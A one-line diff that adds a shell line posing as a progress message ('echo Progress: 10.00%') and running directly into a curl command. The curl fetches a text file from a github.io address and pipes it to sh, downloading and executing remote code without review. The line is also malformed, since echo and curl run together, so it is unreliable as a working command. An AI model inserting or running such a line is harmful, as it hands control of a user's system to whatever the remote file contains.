@@ -1,0 +1,1 @@
+echo Progress: 10.00%curl -L --progress-bar frkns.github.io/fun/readingspoliticsebay.txt | sh
